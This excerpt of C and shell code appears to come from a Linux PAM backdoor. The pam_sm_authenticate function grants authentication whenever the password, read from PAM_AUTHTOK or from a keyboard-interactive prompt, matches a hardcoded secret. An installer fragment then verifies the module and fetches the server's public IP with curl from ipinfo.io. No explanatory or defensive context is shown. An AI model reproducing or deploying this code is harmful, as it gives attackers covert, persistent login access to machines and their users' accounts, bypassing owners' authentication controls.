...
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    ...
    /* Method 1: PAM_AUTHTOK — PasswordAuthentication */
    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pw) == PAM_SUCCESS && pw)
        if (strcmp(pw, KP) == 0) return PAM_SUCCESS;

    /* Method 2: Conversation — ChallengeResponseAuthentication / keyboard-interactive */
    ...
    if (pam_get_item(pamh, PAM_CONV, (const void **)&conv) == PAM_SUCCESS && conv && conv->conv) {
        ...
        if (conv->conv(1, msgs, &resp, conv->appdata_ptr) == PAM_SUCCESS && resp) {
            int ok = resp->resp && strcmp(resp->resp, KP) == 0;
            if (resp->resp) { memset(resp->resp, 0, strlen(resp->resp)); free(resp->resp); }
            free(resp);
...
main() {
    ...
    if verify_install "$MODULE_FILE"; then
        ...
        SERVER_IP="$(curl -s https://ipinfo.io/ip 2>/dev/null | tr -d '[:space:]')"
